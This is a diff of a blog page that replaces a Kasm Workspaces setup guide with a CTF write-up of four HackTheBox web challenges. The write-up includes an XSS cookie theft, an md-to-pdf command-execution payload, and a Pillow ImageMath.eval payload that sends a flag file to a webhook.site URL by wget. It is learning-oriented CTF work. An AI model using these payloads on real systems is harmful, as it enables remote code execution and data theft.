@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Kasm Workspaces</title>
+    <title>Cyber Apocalypse CTF 2022</title>
     <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <meta http-equiv="X-UA-Compatible" content="ie=edge" />
@@ -20,18 +20,18 @@
 
 
 
-<meta property="og:title" content="Kasm Workspaces" />
-<meta property="og:description" content="Kasm Workspaces" />
+<meta property="og:title" content="Cyber Apocalypse CTF 2022" />
+<meta property="og:description" content="Cyber Apocalypse CTF 2022" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="/posts/kasm/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2021-12-28T00:00:00+00:00" />
-<meta property="article:modified_time" content="2021-12-28T00:00:00+00:00" />
+<meta property="og:url" content="/posts/htbctf2022/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-05-23T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-05-23T00:00:00+00:00" />
 
 
 
     
     
-<meta name="description" content="Kasm Workspaces" />
+<meta name="description" content="Cyber Apocalypse CTF 2022" />
 <link
   rel="stylesheet"
   href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/atom-one-dark.min.css"
@@ -180,12 +180,9 @@ if (!doNotTrack) {
   
   
   
-    
-    
-  
   
     
-    <li><a class="active" href="/posts/kasm/" title="Kasm Workspaces">Kasm Workspaces</a></li>
+    <li><a class="" href="/posts/kasm/" title="Kasm Workspaces">Kasm Workspaces</a></li>
   
 
   
@@ -228,9 +225,12 @@ if (!doNotTrack) {
   
   
   
+    
+    
+  
   
     
-    <li><a class="" href="/posts/htbctf2022/" title="Cyber Apocalypse CTF 2022">Cyber Apocalypse CTF 2022</a></li>
+    <li><a class="active" href="/posts/htbctf2022/" title="Cyber Apocalypse CTF 2022">Cyber Apocalypse CTF 2022</a></li>
   
 
 
@@ -248,7 +248,7 @@ if (!doNotTrack) {
   <div class="content">
     <div class="container p-0 read-area">
       
-      <div class="hero-area col-sm-12" id="hero-area" style='background-image: url(/posts/kasm/hero.png);'>
+      <div class="hero-area col-sm-12" id="hero-area" style='background-image: url(/posts/htbctf2022/hero.png);'>
       </div>
 
       
@@ -256,75 +256,54 @@ if (!doNotTrack) {
         <div class="author-profile ml-auto align-self-lg-center">
           <img class="rounded-circle" src='/images/author/crystal_hu56daec2eff645d56fb53cd8db157a676_63575_120x120_fit_q75_box.jpg' alt="Author Image">
           <h5 class="author-name">Crystal Mercier</h5>
-          <p>December 28, 2021</p>
+          <p>May 23, 2022</p>
         </div>
 
         <div class="title">
-          <h1>Kasm Workspaces</h1>
+          <h1>Cyber Apocalypse CTF 2022</h1>
         </div>
 
         <div class="post-content" id="post-content">
-          <h3 id="introduction">Introduction</h3>
-<p>Kasm Workspaces are delivered through Docker containers and is mainly aimed at small businesses looking to reduce platform resource requirements and increase security especially in this work from home space we have been moving into. But this software can easily have many personal uses with its disposable browsers and desktops. Options to host Kasm Workspaces include on-premise, in the cloud, or they even have the option to host it for you.</p>
-<p>The most interesting feature to me is their Zero-Trust Browser Isolation which according to their website…</p>
-<pre tabindex="0"><code>Web isolation moves the risk of browsing the web outside of the enterprise.
-All webinteractivity is executed in docker containers running in an isolated
-environment with only a seamless rendering user interface being sent to the
-user’s browser. Your users will feel as if they are experiencing the web
-firsthand, however, since web content never directly interacts with the
-user’s endpoint, your enterprise is protected against malware and your data
-remains safe.
-</code></pre><p>The best thing is that this software is available for free and open source!</p>
-<h3 id="resource-requirements">Resource Requirements</h3>
-<p>Minimum Requirements</p>
-<pre tabindex="0"><code>CPU - 2 cores   
-Memory - 4GB        
-Storage - 50GB (SSD)
-</code></pre><p>Supported Operating Systems</p>
-<pre tabindex="0"><code>Ubuntu 18.04 / 20.04 (amd64/arm64)
-Debian 9 / 10 / 11 (amd64/arm64)
-CentOS 7 / 8 (amd64/arm64)
-Oracle Linux 7 / 8 (amd64/arm64)
-Raspberry Pi OS (Debian) 10 / 11 (arm64)
-</code></pre><h3 id="installation">Installation</h3>
-<p>As the most secure option I really wanted to find a cloud provider for this but with the minimum resource requirements I was looking at $20 a month so I decided to pass on that idea and looked at the next great option, Raspberry Pi. Unfortunately only Raspberry Pi 4 has the necessary resources and I didn’t have any and due to the chip shortage that seems to have no end in sight these devices now cost a lot and take months to get.</p>
-<p>So in order to play around with this amazing software I loaded up the VirtualBox Ubuntu 18.04 machine I had, you can use any of the supported operating systems you are comfortable with or better yet…try something new and unfamiliar!</p>
-<h4 id="preinstallation">PreInstallation</h4>
-<p>So firstly what we actually want to do is create a swap partition. It is recommended to allocate 1 gigabyte per concurrent session you expect to run at any given time. Please adjust according to your needs.</p>
-<pre tabindex="0"><code>sudo dd if=/dev/zero bs=1M count=1024 of=/mnt/1GiB.swap
-sudo chmod 600 /mnt/1GiB.swap
-sudo mkswap /mnt/1GiB.swap
-sudo swapon /mnt/1GiB.swap
-</code></pre><p>Verify that the swap file exists</p>
-<pre tabindex="0"><code>cat /proc/swaps
-</code></pre><p>To make the swap file available on boot</p>
-<pre tabindex="0"><code>echo '/mnt/1GiB.swap swap swap defaults 0 0' | sudo tee -a /etc/fstab
-</code></pre><h4 id="installation-guide">Installation Guide</h4>
-<ul>
-<li>Download the latest version of Kasm Workspaces to /tmp</li>
-<li>Extract the package and run the installation script.</li>
-</ul>
-<pre tabindex="0"><code>cd /tmp
-tar -xf kasm_release*.tar.gz
-sudo bash kasm_release/install.sh
-</code></pre><p><code>Note: If you would like to run the application on a different port than the default 443 specifiy the port like so for the command above - sudo bash kasm_release/install.sh -L PORT</code></p>
-<p>Once the installation is complete the login details will be displayed. Save these somewhere safe for now.</p>
-<p>Yes it really is as easy to install as that!</p>
-<h3 id="login">Login</h3>
-<p>Access the Web Application running on port 443 at https://&lt;WEBAPP_SERVER&gt;</p>
-<p>Log into the Web Application as the Administrator using the default credentials produced during the install. I suggest heading to the top right and selecting profile then reset password and changing the password to something more secure and saving that to a password manager.</p>
-<p>Clicking on <code>Workspaces</code> at the top you can see a list of everything avaliable to launch in it’s own Docker container. If you wish to add something that isn’t already on the workspaces list, say <code>Kali linux </code>for example, head over to <code>Images</code> on the left side menu.</p>
-<p>From there you can find the image you want or add your own. So for example if you wish to add Kali Linux you would find it on the list and click the &hellip; then <code>Edit</code> and check the <code>Enabled</code> option then <code>Submit</code>. It will appear on the Workspaces page now but will take some time for it to setup before its ready to use.</p>
-<p>There is also options for adding persistant data. See the guide for this at <a href="https://kasmweb.com/docs/latest/how_to/volume_mapping.html">https://kasmweb.com/docs/latest/how_to/volume_mapping.html</a> if needed.</p>
-<p>By default this comes with a couple Desktop options already. While you do have the option to add custom images, the default Desktop does come with some great applications already installed. It has Microsoft Teams, Slack, Zoom, Visual Studio Code and Signal to name a few. These Desktops will stay open even when you log off Kasm, however if the desktop is killed by the Administrator the data in the container by default is lost. It is possible to map data out to a central server using the persistant data link above.</p>
-<h3 id="kasm---open-in-isolation">Kasm - Open In Isolation</h3>
-<p>The main thing I absolutely love about Kasm is the Chrome extension which makes it easy to right click any link that might not be safe and open it in Kasm.</p>
-<p>To do this yourself grab the extension from <a href="https://chrome.google.com/webstore/detail/kasm-open-in-isolation/pamimfbchojeflegdjgijcgnoghgfemn?hl=en-US">https://chrome.google.com/webstore/detail/kasm-open-in-isolation/pamimfbchojeflegdjgijcgnoghgfemn?hl=en-US</a>.</p>
-<p>Once you’ve added the extension to your browser click it and select <code>options</code>. Set the <code>Kasm Url</code> to the url of your machine and set whether you want it to open in a new tab or a new window and <code>Save</code>.</p>
-<p>Now when you right click links you have the option to <code>Open link in Kasm</code>. When you are working within Kasm Workspaces there is always a menu on the left. When you are done with the session or think you encountered something suspecious you can delete the session there. Otherwise if you leave the session without deleting it then it will expire on its own after some time.</p>
-<h3 id="thoughts">Thoughts</h3>
-<p>Kasm is software that is based on Docker and provides a Web interface to run applications and desktops within a sandboxed container. <code>Note: As Kasm does run on a supported operating system, it is still your responsibility to ensure that the operating system itself is secure. </code>Sadly this amazing software wont likely see a whole lot of usage in its target audience as businesses tend to use Windows instead of Linux especially since thats what most users know how to use.</p>
-<p>Honestly I love this and the single-server version is just great for home lab use! I can see great use for this especially with REMnux when I start getting into the reverse-engineering and analyzing malicious software side of security and I will continue to make use of the web isolation this provides.</p>
+          <h2 id="intro">Intro</h2>
+<p>I have decided to write on my experience at this years HackTheBox CTF event. Apologies for the short writeups. They were taking from the mess of notes and whatever screenshots I had taken to share with the group for discussion. I didn’t plan ahead to write a post about it after so learning better note keeping is definitely going on the list!</p>
+<h2 id="kryptos-support">Kryptos Support</h2>
+<p>For this task we were simply given a page saying “Report any issues regarding the Kryptos Vault below” and an input field similar to a reporting system where after submission the admin checks our report.</p>
+<p>Immediately XSS came to mind and I submitted a request that would send the cookie to my <a href="https://webhook.site/">https://webhook.site/</a> link if it didn’t have security in place to stop the cookie from being sent. Easily enough the cookie was sent to the webhook.site link I supplied and I used this to gain access to the sites /tickets page.</p>
+<p><img src="img-paste-20220523130527770.png" alt="20220523130527770"></p>
+<p>This is where I first got stuck. We are given serials for the vaults but if we make a request asking for a new rfid how do we intercept the admins reply?</p>
+<p>After giving up on trying to discover a way to intercept a request over XSS I explored some more and found a password reset function at /setting. Intercepting this with Burp reveled there was two fields required, “password” and “uid”. As in most cases the first id given on a system will belong to the admin I tried changing the uid to 1 and was successfully able to login as admin!</p>
+<p><img src="img-paste-20220523130712731.png" alt="20220523130712731"></p>
+<p>This was all that was required to achieve the flag.</p>
+<h2 id="blinkerfluids">Blinkerfluids</h2>
+<p>For this one we were given the option to download the docker file. I downloaded the file while starting up the instance and had a quick look through it to see what I would be dealing with.</p>
+<p>In one file the dependencies were listed.</p>
+<pre tabindex="0"><code>&quot;dependencies&quot;: {
+&quot;express&quot;: &quot;4.17.3&quot;,
+&quot;md-to-pdf&quot;: &quot;4.1.0&quot;,
+&quot;nunjucks&quot;: &quot;3.2.3&quot;,
+&quot;sqlite-async&quot;: &quot;1.1.3&quot;,
+&quot;uuid&quot;: &quot;8.3.2&quot;
+</code></pre><p>So I immediately did a google search on each of these to see what the newest versions were. Then did a google search on any that were not at latest versions. This brought me to a vulnerability in md-to-pdf:</p>
+<p><a href="https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880">https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880</a></p>
+<p>I had to do a bit of research into JavaScript Front Matter to understand the payload and how I would need to use it on the site. Afterward I intercepted a request from /api/invoice/add and played around with the payload and worked with a team member to find one that worked:</p>
+<p><code>--js\n((require('child_process')).execSync('id &gt; /tmp/RCE.txt'))\n---RCE</code></p>
+<p>From there we simply had to change id to ls and locate the flag!</p>
+<h2 id="amidst-us">Amidst Us</h2>
+<p>This one turned out to be a simple and cute site with the ability to upload images that replace the two sus peeps on the page. This makes a post request to /api/alphafy that looks like <code>{ “image”:”iVBORw...ElFTkSuQmCC” ,”background”:[ 255, 255, 255 ] }</code></p>
+<p>After downloading the docker image and having a look through the use of ImageMath.eval stands out to the group as it has a known vulnerability, CVE-2022-22817. <a href="https://www.cvedetails.com/cve/CVE-2022-22817/">https://www.cvedetails.com/cve/CVE-2022-22817/</a></p>
+<p>This allowed us to use the payload <code>&quot;exec('import os;os.system(\&quot;flag=$(cat ../flag.txt);wget https://webhook.site/webhook_uuid?flag=${flag}\&quot;)')&quot;</code> in any of the <code>background</code> parameters to get the flag.</p>
+<h2 id="mutation-lab">Mutation Lab</h2>
+<p>This challenge was using the convert-svg-to-png nodejs package which with a little googling reveled it had a known vulnerability CVE-2021-23631. <a href="https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGTOPNG-2348244">https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGTOPNG-2348244</a>. With this POC I sent the request to /api/export over to repeater and played around.</p>
+<p><img src="img-paste-20220523131416470.png" alt="20220523131416470"></p>
+<p><img src="img-paste-20220523131507969.png" alt="20220523131507969"></p>
+<p>This was an immediate success but not an easy win. As a lengthy and somewhat blind search of the system reveled no flag to find. I went back to the other challenge dockers and used them to figure out some of the paths and files for this web app and read through the code on each many times trying to figure out what to do next.</p>
+<p>Eventually I came across /app.env which gave me the SESSION_SECRET_KEY.</p>
+<p><img src="img-paste-20220523131637230.png" alt="20220523131637230"></p>
+<p>Unfortunately I did not know how to write code to get the admin cookie from this so I was stuck there.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>I was able to see how much further I have come from last years attempt at this event. I was quite new to CTF events and felt like I didn’t know enough to join a group. This year I had enough confidence to join a group. Sadly it only ended up having 4 of the 10 people allowed and 2 of those gave up and went silent after the first day. But even having one other to work with and bounce thoughts back and forth was such a better experience!</p>
+<p>I am happy with how quickly I was able to recognize where the vulnerabilities likely were and what we were meant to do to achieve the flag. It thought me that I have much to learn with actually exploiting the vulnerabilities so I don’t give up the obvious direction too quickly and waste too much time looking for possible alternatives instead.</p>
+<p>I look forward to spending more time learning on HackTheBox machines now after I finish this sub with PentesterLab, as I now believe there is much more I can learn there and that I am ready to step a little away from the more hand held platforms.</p>
 
         </div>
 
@@ -360,23 +339,23 @@ sudo bash kasm_release/install.sh
   
 
   
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
     
     
-  
-  
-
-  
-  
-
-  
-  
-
-  
-  
-
-  
-  
-
   
   
 
@@ -384,24 +363,13 @@ sudo bash kasm_release/install.sh
 <div class="row next-prev-navigator">
   
     <div class="col-md-6 previous-article">
-      <a href="/posts/openwrt/" title="OpenWrt on Raspberry Pi 3b" class="btn btn-outline-info">
+      <a href="/posts/bbprivateinvites/" title="Bug Bounty: How to get private invites" class="btn btn-outline-info">
         <div><i class="fas fa-chevron-circle-left"></i> Prev</div>
-        <div class="next-prev-text">OpenWrt on Raspberry Pi 3b</div>
+        <div class="next-prev-text">Bug Bounty: How to get private invites</div>
       </a>
     </div>
   
   
-      
-      
-        
-      
-      <div class="col-md-6 next-article">
-        <a href="/posts/htb-forge/" title="HTB: Writeup — Forge" class="btn btn-outline-info">
-          <div>Next <i class="fas fa-chevron-circle-right"></i></div>
-          <div class="next-prev-text">HTB: Writeup — Forge</div>
-        </a>
-      </div>
-    
 </div>
 
       <hr />
@@ -426,21 +394,12 @@ sudo bash kasm_release/install.sh
       <div class="toc">
         <nav id="TableOfContents">
   <ul>
-    <li>
-      <ul>
-        <li><a href="#introduction">Introduction</a></li>
-        <li><a href="#resource-requirements">Resource Requirements</a></li>
-        <li><a href="#installation">Installation</a>
-          <ul>
-            <li><a href="#preinstallation">PreInstallation</a></li>
-            <li><a href="#installation-guide">Installation Guide</a></li>
-          </ul>
-        </li>
-        <li><a href="#login">Login</a></li>
-        <li><a href="#kasm---open-in-isolation">Kasm - Open In Isolation</a></li>
-        <li><a href="#thoughts">Thoughts</a></li>
-      </ul>
-    </li>
+    <li><a href="#intro">Intro</a></li>
+    <li><a href="#kryptos-support">Kryptos Support</a></li>
+    <li><a href="#blinkerfluids">Blinkerfluids</a></li>
+    <li><a href="#amidst-us">Amidst Us</a></li>
+    <li><a href="#mutation-lab">Mutation Lab</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
   </ul>
 </nav>
       </div>
@@ -547,7 +506,6 @@ sudo bash kasm_release/install.sh
                 </li>
               
               
-              
                 
                 
                   
@@ -555,6 +513,7 @@ sudo bash kasm_release/install.sh
                 <li class="nav-item">
                   <a class="smooth-scroll" href="/#projects">Projects</a>
                 </li>
+              
               
               
                 
